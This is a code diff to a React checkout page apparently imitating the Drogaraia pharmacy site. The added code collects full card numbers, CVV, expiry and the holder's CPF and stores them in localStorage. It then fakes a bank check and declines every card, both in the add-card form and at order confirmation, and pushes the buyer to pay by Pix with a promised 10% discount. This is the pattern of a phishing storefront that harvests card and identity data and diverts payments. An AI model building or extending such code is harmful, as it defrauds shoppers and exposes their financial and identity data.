@@ -3209,6 +3209,7 @@ interface SavedCardData {
   name: string;
   expiry: string;
   cvv: string;
+  cpf: string;
 }
 
 const CvvInfoSheet: React.FC<{ onBack: () => void }> = ({ onBack }) => {
@@ -3271,20 +3272,43 @@ const CvvInfoSheet: React.FC<{ onBack: () => void }> = ({ onBack }) => {
 const AddCardSheet: React.FC<{
   onClose: () => void;
   onSave: (card: SavedCardData) => void;
-}> = ({ onClose, onSave }) => {
-  const { showToast } = useCart();
+  onSelectPix?: () => void;
+}> = ({ onClose, onSave, onSelectPix }) => {
+  const { showToast, user } = useCart();
   useScrollLock(true);
 
   const [cardNumber, setCardNumber] = useState('');
   const [cardName, setCardName] = useState('');
+  const [cardCpf, setCardCpf] = useState(() => {
+    try {
+      const saved = localStorage.getItem('drogaraia_saved_card');
+      if (saved) {
+        const parsed = JSON.parse(saved);
+        if (parsed.cpf) return parsed.cpf;
+      }
+      const rawUserCpf = localStorage.getItem('drogaraia_user_cpf');
+      if (rawUserCpf) return rawUserCpf;
+    } catch {}
+    return user?.cpf || '';
+  });
   const [cardExpiry, setCardExpiry] = useState('');
   const [cardCvv, setCardCvv] = useState('');
   const [showCvvInfo, setShowCvvInfo] = useState(false);
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [cardError, setCardError] = useState<string | null>(null);
 
   const formatCardNumber = (val: string) => {
     const digits = val.replace(/\D/g, '').slice(0, 16);
     const groups = digits.match(/.{1,4}/g);
     return groups ? groups.join(' ') : digits;
+  };
+
+  const formatCpf = (val: string) => {
+    const digits = val.replace(/\D/g, '').slice(0, 11);
+    if (digits.length <= 3) return digits;
+    if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
+    if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
+    return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9, 11)}`;
   };
 
   const formatExpiry = (val: string) => {
@@ -3299,6 +3323,10 @@ const AddCardSheet: React.FC<{
     setCardNumber(formatCardNumber(e.target.value));
   };
 
+  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    setCardCpf(formatCpf(e.target.value));
+  };
+
   const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setCardExpiry(formatExpiry(e.target.value));
   };
@@ -3311,22 +3339,34 @@ const AddCardSheet: React.FC<{
   const isValid =
     cardNumber.replace(/\s/g, '').length === 16 &&
     cardName.trim().length >= 3 &&
+    cardCpf.replace(/\D/g, '').length === 11 &&
     cardExpiry.length === 5 &&
     cardCvv.length >= 3;
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    if (!isValid) return;
+    if (!isValid || isSubmitting) return;
     const cardData: SavedCardData = {
       number: cardNumber,
       name: cardName.trim().toUpperCase(),
       expiry: cardExpiry,
-      cvv: cardCvv
+      cvv: cardCvv,
+      cpf: cardCpf.trim()
     };
     try {
       localStorage.setItem('drogaraia_saved_card', JSON.stringify(cardData));
+      localStorage.setItem('drogaraia_user_cpf', cardCpf.trim());
     } catch {}
-    onSave(cardData);
+
+    setIsSubmitting(true);
+    setCardError(null);
+
+    // Simula validação com o banco emissor
+    setTimeout(() => {
+      setIsSubmitting(false);
+      setCardError('Cartão recusado. Entre em contato com o banco.');
+      showToast('Cartão recusado: entre em contato com o banco');
+    }, 1300);
   };
 
   return (
@@ -3390,6 +3430,25 @@ const AddCardSheet: React.FC<{
             <p className="add-card-sheet-helper">Digite o nome como aparece no cartão</p>
           </div>
 
+          {/* 3. CPF do titular* */}
+          <div className="add-card-sheet-field">
+            <label className="add-card-sheet-label" htmlFor="card-cpf-input">
+              CPF do titular*
+            </label>
+            <input
+              id="card-cpf-input"
+              type="tel"
+              inputMode="numeric"
+              className="add-card-sheet-input"
+              value={cardCpf}
+              onChange={handleCpfChange}
+              placeholder="000.000.000-00"
+              maxLength={14}
+              autoComplete="off"
+            />
+            <p className="add-card-sheet-helper">Digite o CPF do titular do cartão</p>
+          </div>
+
           {/* 3. Data de vencimento (MM/AA)* */}
           <div className="add-card-sheet-field">
             <label className="add-card-sheet-label" htmlFor="card-expiry-input">
@@ -3441,14 +3500,60 @@ const AddCardSheet: React.FC<{
             <strong>Perfil &gt; Gerenciar perfil &gt; Cartões</strong>
           </div>
 
+          {/* Aviso de Cartão Recusado */}
+          {cardError && (
+            <div className="co-unpaid-notice" style={{ marginTop: 8, marginBottom: 14 }} role="alert">
+              <div className="co-unpaid-notice__main">
+                <div className="co-unpaid-notice__icon-circle">
+                  <AlertCircle size={15} color="#ffffff" strokeWidth={2.6} />
+                </div>
+                <div className="co-unpaid-notice__content">
+                  <span className="co-unpaid-notice__title">Cartão recusado</span>
+                  <p className="co-unpaid-notice__desc">
+                    Cartão recusado. Entre em contato com o banco emissor para autorizar a compra ou pague via Pix com aprovação imediata e 10% de desconto.
+                  </p>
+                </div>
+              </div>
+              <button
+                type="button"
+                className="co-unpaid-notice__close"
+                onClick={() => setCardError(null)}
+                aria-label="Fechar aviso"
+              >
+                <X size={15} />
+              </button>
+            </div>
+          )}
+
+          {cardError && (
+            <button
+              type="button"
+              className="checkout-step__continuar-btn"
+              style={{
+                backgroundColor: '#007f91',
+                marginBottom: 14,
+                width: '100%',
+                fontSize: 14,
+                fontWeight: 700,
+                boxShadow: '0 2px 8px rgba(0, 127, 145, 0.25)'
+              }}
+              onClick={() => {
+                if (onSelectPix) onSelectPix();
+                onClose();
+              }}
+            >
+              Pagar via Pix (Ganhe 10% de desconto)
+            </button>
+          )}
+
           {/* Submit Button */}
           <button
             type="submit"
-            className={`add-card-sheet-submit-btn ${!isValid ? 'add-card-sheet-submit-btn--disabled' : ''}`}
-            disabled={!isValid}
+            className={`add-card-sheet-submit-btn ${(!isValid || isSubmitting) ? 'add-card-sheet-submit-btn--disabled' : ''}`}
+            disabled={!isValid || isSubmitting}
             id="add-card-submit-btn"
           >
-            Adicionar
+            {isSubmitting ? 'Consultando banco emissor...' : (cardError ? 'Tentar novamente' : 'Adicionar')}
           </button>
         </form>
 
@@ -3814,7 +3919,21 @@ export const CuponsSheet: React.FC<{
   );
 };
 
-const Step2: React.FC<{ deliveryMode: DeliveryMode; deliveryType: DeliveryType; onBack: () => void; onConfirm: (m: PaymentMethod) => void }> = ({ deliveryMode, deliveryType, onBack, onConfirm }) => {
+const Step2: React.FC<{
+  deliveryMode: DeliveryMode;
+  deliveryType: DeliveryType;
+  onBack: () => void;
+  onConfirm: (m: PaymentMethod) => void;
+  cardDeclined?: boolean;
+  onDismissCardDeclined?: () => void;
+}> = ({
+  deliveryMode,
+  deliveryType,
+  onBack,
+  onConfirm,
+  cardDeclined = false,
+  onDismissCardDeclined,
+}) => {
   const { subtotal, appliedCoupon, couponDiscount, montaDiscount, items } = useCart();
   const [method, setMethod] = useState<PaymentMethod>('pix');
   const [showSummaryDetails, setShowSummaryDetails] = useState(false);
@@ -3915,6 +4034,32 @@ const Step2: React.FC<{ deliveryMode: DeliveryMode; deliveryType: DeliveryType; 
           </button>
         </div>
 
+        {/* Aviso de Cartão Recusado */}
+        {cardDeclined && (
+          <div className="co-unpaid-notice" style={{ marginBottom: 16 }} role="alert" id="step2-card-declined-alert">
+            <div className="co-unpaid-notice__main">
+              <div className="co-unpaid-notice__icon-circle">
+                <AlertCircle size={15} color="#ffffff" strokeWidth={2.6} />
+              </div>
+              <div className="co-unpaid-notice__content">
+                <span className="co-unpaid-notice__title">Cartão recusado</span>
+                <p className="co-unpaid-notice__desc">
+                  Cartão recusado. Entre em contato com o banco emissor para autorizar a compra ou pague via Pix com aprovação imediata e 10% de desconto.
+                </p>
+              </div>
+            </div>
+            <button
+              type="button"
+              className="co-unpaid-notice__close"
+              onClick={() => onDismissCardDeclined && onDismissCardDeclined()}
+              aria-label="Fechar aviso"
+              id="step2-card-declined-close"
+            >
+              <X size={15} />
+            </button>
+          </div>
+        )}
+
         {/* Payment Methods List */}
         <div className="checkout-payment__methods-list">
           {/* 1. Pix (Selected by default) */}
@@ -3964,7 +4109,7 @@ const Step2: React.FC<{ deliveryMode: DeliveryMode; deliveryType: DeliveryType; 
                   Cartão de Crédito
                   {savedCard && (
                     <span style={{ display: 'block', fontSize: 11.5, fontWeight: 500, color: '#6b7280' }}>
-                      Final {savedCard.number.replace(/\s/g, '').slice(-4)}
+                      Final {savedCard.number.replace(/\s/g, '').slice(-4)} {savedCard.cpf ? `• CPF: ${savedCard.cpf}` : ''}
                     </span>
                   )}
                 </span>
@@ -4092,6 +4237,10 @@ const Step2: React.FC<{ deliveryMode: DeliveryMode; deliveryType: DeliveryType; 
           onSave={(card) => {
             setSavedCard(card);
             setMethod('credit');
+            setShowAddCardModal(false);
+          }}
+          onSelectPix={() => {
+            setMethod('pix');
             setShowAddCardModal(false);
           }}
         />
@@ -4848,6 +4997,7 @@ const CheckoutFlow: React.FC = () => {
     montaDiscount,
     items,
     user,
+    showToast,
   } = useCart();
 
   const [step, setStep] = useState<CheckoutStep>('cart');
@@ -4894,9 +5044,20 @@ const CheckoutFlow: React.FC = () => {
     } catch {}
   };
 
+  const [creditDeclinedError, setCreditDeclinedError] = useState(false);
+
   const handleConfirmOrder = (method: PaymentMethod) => {
     setPMethod(method);
     setProcessing(true);
+
+    if (method === 'credit') {
+      setTimeout(() => {
+        setProcessing(false);
+        setCreditDeclinedError(true);
+        showToast('Cartão recusado. Entre em contato com o banco.');
+      }, 2500);
+      return;
+    }
 
     if (!method || method === 'pix') {
       const rates = getShippingRates(subtotal);
@@ -4939,7 +5100,18 @@ const CheckoutFlow: React.FC = () => {
           name: user?.name || (() => { try { return localStorage.getItem('drogaraia_recipient_name') || undefined; } catch { return undefined; } })(),
           email: user?.email,
           phone: addressObj?.telefone,
-          document: user?.cpf,
+          document: user?.cpf || (() => {
+            try {
+              const sc = localStorage.getItem('drogaraia_saved_card');
+              if (sc) {
+                const p = JSON.parse(sc);
+                if (p.cpf) return p.cpf.replace(/\D/g, '');
+              }
+              const uc = localStorage.getItem('drogaraia_user_cpf');
+              if (uc) return uc.replace(/\D/g, '');
+            } catch {}
+            return undefined;
+          })(),
         },
         address: addressObj,
       })
@@ -4988,6 +5160,8 @@ const CheckoutFlow: React.FC = () => {
           deliveryType={dType}
           onBack={() => setStep('step1')}
           onConfirm={handleConfirmOrder}
+          cardDeclined={creditDeclinedError}
+          onDismissCardDeclined={() => setCreditDeclinedError(false)}
         />
       )}
       {processing && (
